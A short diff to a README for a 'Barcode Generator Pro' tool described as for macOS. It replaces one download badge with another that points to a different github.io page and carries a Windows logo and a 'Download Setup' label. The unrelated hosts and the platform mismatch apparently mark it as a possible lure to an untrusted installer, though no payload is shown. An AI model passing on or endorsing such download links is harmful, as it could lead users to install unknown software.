@@ -1,10 +1,6 @@
 # 🧾 Barcode Generator Pro — Professional Barcode Creation Tool for macOS
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/BArcode">
-    <img src="https://img.shields.io/badge/⬇️_Download_Barcode_Generator_Pro-16a085?style=for-the-badge&logo=apple&logoColor=white" alt="Download Barcode Generator Pro for macOS">
-  </a>
-</p>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://amyglowblrcj.github.io/.github/Barcode-Generator-Pro)
 
 ---
 
